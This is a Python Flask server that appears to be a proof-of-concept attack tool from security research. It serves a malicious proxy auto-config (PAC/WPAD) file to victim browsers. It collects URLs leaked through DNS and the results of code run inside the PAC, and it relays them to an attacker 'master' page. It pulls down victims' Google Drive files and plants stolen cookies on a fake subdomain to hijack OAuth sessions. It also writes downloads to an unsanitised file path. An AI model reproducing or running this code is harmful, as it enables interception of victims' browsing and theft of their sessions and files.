from flask import Flask, make_response, send_file, Response, request, send_from_directory, render_template, redirect
import os, json, re, uuid
from datetime import datetime
import urllib2, requests
import gevent
import argparse

from gevent.queue import Queue, Full
from gevent.wsgi import WSGIServer
from gevent import monkey
from PACDNSServer import PACDNSServer

app = Flask(__name__)

next_pac_session_id = 0

pac_sessions = {}
victim_subscriptions = {}
master_subscriptions = []
subscriptions_by_pacsid = {}

gdrive_request_sessions = {}

# Read DNS events from the queue and push them out to subscribers
def handle_subscriptions(dns_queue):
    while True:
        info = dns_queue.get()
        pac_sid = info['pac_sid']
        if info['type'] == 'eval' and info['data'].startswith('sidrequest-'):
            # victim script registering its subscription id
            sub_id = info['data'].replace('sidrequest-', '')
            register_pac_sub(sub_id, pac_sid)
        print(info)
        # send leaked URL or eval result back to the originating victim browser
        if pac_sid in subscriptions_by_pacsid:
            subscriptions_by_pacsid[pac_sid].put(info)
        # also send everything to all master subscriptions
        for q in master_subscriptions:
            q.put(info)

def master_broadcast(**data):
    for q in master_subscriptions:
        q.put(data)

def victim_broadcast(**data):
    for s in victim_subscriptions.values():
        s['queue'].put(data)

# link a SSE subscription with a PAC session ID
# this allows us to send leaked URLs and PAC JS eval results back to the originating browser
def register_pac_sub(sub_id, pac_sid):
    if sub_id not in victim_subscriptions:
        return
    app.logger.debug("Registering victim subscription ID {} to PAC SID {}".format(sub_id, pac_sid))
    q = victim_subscriptions[sub_id]['queue']
    victim_subscriptions[sub_id]['pac_sid'] = pac_sid
    subscriptions_by_pacsid[pac_sid] = q


def sub_id_to_pac_sid(sub_id):
    pac_sid = None
    if sub_id in victim_subscriptions:
        pac_sid = victim_subscriptions[sub_id]['pac_sid']
    return pac_sid

# allows victim pages to publish data to master page or vice versa
@app.route('/publish')
def publishMsg():
    msg = request.args.get('msg', None)
    sub_id = request.args.get('qid', None)
    to = request.args.get('to', 'master')
    channel = request.args.get('channel', 'msg')
    if not sub_id:
        return ''

    if to == 'master':
        pac_sid = sub_id_to_pac_sid(sub_id)
        master_broadcast(type=channel, msg=msg, pac_sid=pac_sid)
    elif to == 'victims':
        victim_broadcast(type=channel, msg=msg)
    return ''

# Download files from Google Drive
@app.route('/google-doc-download/')
def googleDoc():
    url = request.args.get('url', None)
    sub_id = request.args.get('qid', None) # the id of the SSE subscription
    if not sub_id or not url:
        return ''

    # set up or fetch Requests session to keep cookies
    sess =  gdrive_request_sessions.get(sub_id, None)
    if not sess:
        gdrive_request_sessions[sub_id] = sess = requests.Session()

    r = sess.get(url, allow_redirects=False, stream=True)
    if r.status_code == 302: # If we get a 302, send it back to the victim to request
        loc = r.headers['location']
        print("googleDoc 302 - " + loc)
        victim_subscriptions[sub_id]['queue'].put(dict(type='do_request', url=loc))
    elif r.status_code == 200: # We can download the file
        content_type = r.headers.get('content-type', 'no-type')
        content_len = r.headers.get('content-length', 0)
        result = re.findall("filename\*=UTF-8''(.*)", r.headers['content-disposition'])
        if result:
            filename = urllib2.unquote(result[0])
        else:
            filename = str(content_len) + content_type.replace('/','_') + '.bin'
        master_broadcast(type='show_url', msg = dict(title='Got GDrive File', linktext=filename, href='/static/gdrive/'+filename));
        print("got 200 - " + content_type + " " + str(content_len) + " " + filename)
        with open('download/' + filename, 'w') as f: # yolosec
        	for chunk in r.iter_content(1024):
        	    f.write(chunk)
    return ''

@app.route('/static/gdrive/<path:path>')
def get_gdrive_file(path):
    return send_from_directory('download', path);

# This used by the JavaScript PACServer.scrapeUrl function
@app.route("/util/requests")
def flask_util_requests():
    url = request.args.get("url", None)
    regex = request.args.get("regex", None)
    cookies = json.loads(request.args.get("cookies", "{}"))

    if url is None:
        return json.dumps([])

    headers = { "user-agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36", "upgrade-insecure-requests" : "1", "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",  }
    r = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False);
    if regex is None:
        data = [r.text]
    else:
        print(regex)
        data = re.findall(regex, r.text)

    response = {
        "code" : r.status_code,
        "headers" : { x : y for x, y in r.headers.items()},
        "cookies" : r.cookies.get_dict(),
        "data" : data,
    }
    print(repr(response))
    return json.dumps(response)

# This is used by the OAuth demo to inject stolen cookies into a fake subdomain of the target site
@app.route("/util/redirect")
def flask_util_redirect():
    url = request.args.get("url", None)
    if url is None:
        return ""
    cookies = json.loads(request.args.get("cookies", "{}"))

    #Hack
    domain = "." + request.args.get("domain", ".".join(url.split('/')[2].split(".")[1:]))
    if domain == ".None":
        domain = None

    resp = make_response(redirect(url))
    for cookie in cookies:
        resp.set_cookie(cookie, value=cookies[cookie], domain=domain)

    return resp


# Serve a PAC file with a unique session ID
@app.route("/proxy.pac")
@app.route("/wpad.dat")
def ProxyWpad():
    global next_pac_session_id
    # if a browser script is using just using wpad.dat for the JS functions then don't register it
    not_a_pac_request = 'notapacrequest' in request.args

    user_agent = request.headers.get('user-agent', 'None')
    timestamp = datetime.now().strftime('%c')
    if not_a_pac_request:
        pac_sid = 0
    else:
        pac_sid = next_pac_session_id = next_pac_session_id + 1
        pac_sessions[pac_sid] = {'user_agent': user_agent, 'sid': pac_sid, 'timestamp': timestamp}
        app.logger.debug("Sent PAC script for UA: {} SID: {}".format(user_agent, pac_sid))
        master_broadcast(type='pac_sessions', sessions=pac_sessions)

    templ = render_template("pac.js", user_agent=json.dumps(user_agent), session_id=json.dumps(pac_sid), timestamp=json.dumps(timestamp))
    resp = make_response(templ)
    resp.headers['Content-type'] = "application/x-ns-proxy-autoconfig"
    resp.cache_control.max_age = 3600
    return resp

def add_subscription(is_master=False):
    q = Queue()
    sub_id = str(uuid.uuid4())
    q.put(dict(type='sub_id', sub_id=sub_id))
    if is_master:
        master_subscriptions.append(q)
        q.put(dict(type='pac_sessions', sessions=pac_sessions))
    else:
        victim_subscriptions[sub_id] = {'queue':q, 'pac_sid': None }
    return q, sub_id

def remove_subscription(q, sub_id):
    if q in master_subscriptions:
        app.logger.warning("removing master subscription " + sub_id)
        master_subscriptions.remove(q)
    else:
        app.logger.warning("removing victim subscription " + sub_id)
        pac_sid = victim_subscriptions[sub_id]['pac_sid']
        if sub_id in victim_subscriptions:
            del victim_subscriptions[sub_id]
        if pac_sid in subscriptions_by_pacsid:
            del subscriptions_by_pacsid[pac_sid]

@app.route("/subscribe")
def subscribe():
    def gen(is_master = False):
        q, sub_id = add_subscription(is_master)
        m = 'victim'
        if is_master:
            m = 'master'
        app.logger.info("started {} subscription {}".format(m, sub_id))
        try:
            while True:
                result = q.get()
                yield "data: {}\n\n".format(json.dumps(result)) # HTML S Server-Sent Event format
        except GeneratorExit:
            remove_subscription(q, sub_id)

    is_master = 'master' in request.args
    return Response(gen(is_master), mimetype="text/event-stream")

@app.route('/static/<path:path>')
def files(path):
    return send_from_directory('static', path)

@app.route('/')
def index():
    return send_file('static/index.html')
    
monkey.patch_all() # make threaded DNS server play nicely with gevent

def start_servers(upstream_dns, ifname):
    dns_queue = Queue()
    dnsserver = PACDNSServer(upstream_dns, queue=dns_queue)
    dnsserver.start()
    gevent.spawn(handle_subscriptions, dns_queue)
    server = WSGIServer(('0.0.0.0', 8081), app)
    server.serve_forever()

if __name__ == "__main__":
    app.debug = True
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ifname', help='Network interface with IP that "master" browser can reach (used for OAuth demo)', default='eth0')
    parser.add_argument('-d', '--dns', help='Upstream DNS server (defaults to Google DNS)', default='8.8.8.8')
    args = parser.parse_args()
    start_servers(args.dns, args.ifname)
